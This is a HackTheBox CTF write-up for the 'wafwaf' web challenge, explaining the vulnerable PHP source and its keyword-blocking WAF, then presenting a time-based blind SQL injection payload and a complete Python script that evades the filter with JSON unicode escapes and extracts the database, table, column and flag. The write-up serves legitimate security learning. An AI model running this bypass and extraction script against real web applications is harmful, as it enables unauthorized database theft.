---
title: HackTheBox Challenge - Web - wafwaf
created: 2021-08-21
tags:
  - 'ctf'
  - 'sqli'
  - htb
  - web
---

- Let's start with the challenge. It's a medium category challenge 
- If we navigate to the given ip address we get this source code
![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img1.png)

```php
<?php error_reporting(0);
require 'config.php';

class db extends Connection 
{
    public function waf($s) 
    {
        if (preg_match_all('/'. implode('|', array(
            '[' . preg_quote("(*<=>|'&-@") . ']',
            'select', 'and', 'or', 'if', 'by', 'from', 
            'where', 'as', 'is', 'in', 'not', 'having'
        )) . '/i', $s, $matches)) 
            die(var_dump($matches[0]));
        
        return json_decode($s);
    }

    public function query($sql) 
    {
        $args = func_get_args();
        unset($args[0]);
        return parent::query(vsprintf($sql, $args));
    }
}

$db = new db();

if ($_SERVER['REQUEST_METHOD'] == 'POST') 
{
    $obj = $db->waf(file_get_contents('php://input'));
    $db->query("SELECT note FROM notes WHERE assignee = '%s'", $obj->user);

} 
else 
{
    die(highlight_file(__FILE__, 1));
}
?>
```

- Starting from the top the function `error_reporting(0);` is used to remove all errors, warnings, parse messages, and notices, the parameter that should be passed to the error_reporting function **is zero**.
- Then we have a `db` class which inheriting from the `Connection` class. Inside this class we have a method(function) called `waf` which is basically filtering out our inputs and working as some kind of firewall hence the name waf:`web application firewall`. 
- Then the `preg_match_all()` function returns the number of matches of a pattern that were found in a string and populates a variable with the matches that were found.
- The `implode()` is a builtin function in PHP and is used to join the elements of an array. implode() is an alias for [PHP | join() function](https://www.geeksforgeeks.org/php-join-function/) and works exactly same as that of join() function. 
- And the `preg_quote()` function adds a backslash to characters that have a special meaning in regular expressions so that searches for the literal characters can be done. This function is useful when using user input in regular expressions.
- So if we insert any kind of input which contains the black listed commands the query will simply die dumping the matches & will not return anything. 

- Playing with the input field & I got these
- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img2.png)
- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img3.png)
- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img4.png)
- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img5.png)
- So `'` is getting filtered but we can use `"` and also case-insensitive.
- After some more research I found this article which states we can bypass WAFs by sending uincode escaped characters  sending them as JSON objects. https://trustfoundry.net/bypassing-wafs-with-json-unicode-escape-sequences/
- Some hard word trail & error i finally created a payload which actually works `{"user":"d' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))NtXP)-- wxyg"}`
- Building on this I created a script for this

```py
#!/usr/bin/python3
#TODO: Too slow add threading 
import requests
from time import time
from sys import argv
import string

url = f"http://{argv[1]}/"
char_set = string.ascii_lowercase + '_' #+ string.digits  
flag_set = string.ascii_lowercase + '_' + string.digits + '}' #+ string.ascii_uppercase 

def uni_encode(payload):
	result = ""
	for i in range(len(payload)):
		result += '\\u%.4X' % ord(payload[i])
	return result	

def fetch_data(url, len_, name):
	global database
	print("[*]Getting info...")
	res = ""
	#print('{"user":"%s"}' % payload)
	for i in range(1, len_+1):
		for char in char_set:
			payload = f"d' AND (SELECT 1337 FROM (SELECT((IF((SELECT SUBSTR(column_name, {i}, 1) FROM information_schema.columns WHERE table_schema LIKE '{database}' AND table_name LIKE '%flag%' LIMIT 1 ) = '{char}' ,SLEEP(5),0))))x)-- wxyg"
			#print (payload)
			#exit()
			encoded_payload = uni_encode(payload)
			json_data = '{"user":"%s"}' % encoded_payload
			
			#print(encoded_payload)
			#print(json_data)
			try:
				start = time()
				r = requests.post(url, data=json_data)
				end = time()
			except :
				pass

			if (end - start) > 5:
				res += char
				print(f"[*]{name}: {res}")
				#break
			
	return res

def get_flag(url):
	global database, table, column
	print("[*]Getting Flag...")
	flag = "HTB{"
	
	while '}' not in flag:
		pos = len(flag) + 1
		for char in flag_set:
			payload = f"d' AND (SELECT 1337 FROM (SELECT((IF((SELECT SUBSTR({column}, {pos}, 1) FROM {database}.{table} ) = '{char}', SLEEP(3), 0))))x)-- wxyg"
			#print (payload)
			#exit()
			encoded_payload = uni_encode(payload)
			json_data = '{"user":"%s"}' % encoded_payload
			
			#print(encoded_payload)
			#print(json_data)
			try:
				start = time()
				r = requests.post(url, data=json_data)
				end = time()
			except :
				pass

			if (end - start) > 3:
				flag += char
				print(f"[*]FLag: {flag}")
				break
	return flag


#payload = "d' AND (SELECT 1337 FROM (SELECT((IF((SELECT SUBSTR(table_schema, 1, 1) FROM information_schema.tables WHERE table_schema LIKE '%db%' AND table_name LIKE '%flag%' LIMIT 1 ) = 'd' ,SLEEP(5),0))))x)-- wxyg"
# database = fetch_data(url, 8, Database)
# print(database)
database = "db_m8452"


#payload = f"d' AND (SELECT 1337 FROM (SELECT((IF((SELECT SUBSTR(table_name, {i}, 1) FROM information_schema.tables WHERE table_schema LIKE '{database}' AND table_name LIKE '%flag%' LIMIT 1 ) = '{char}' ,SLEEP(5),0))))x)-- wxyg"
#tables = fetch_data(url, 21, "Tables")
table = "definitely_not_a_flag"

#payload = f"d' AND (SELECT 1337 FROM (SELECT((IF((SELECT SUBSTR(column_name, {i}, 1) FROM information_schema.columns WHERE table_schema LIKE '{database}' AND table_name LIKE '%flag%' LIMIT 1 ) = '{char}' ,SLEEP(5),0))))x)-- wxyg"
#columns = fetch_data(url, 4, "Columns")
column = "flag"

print(f"[!]Flag: {get_flag(url)}")
```
- We got the info. about the database, table and column
- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img6.png)
- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img7.png)
- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img8.png)
- We got the flag 
- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img9.png)
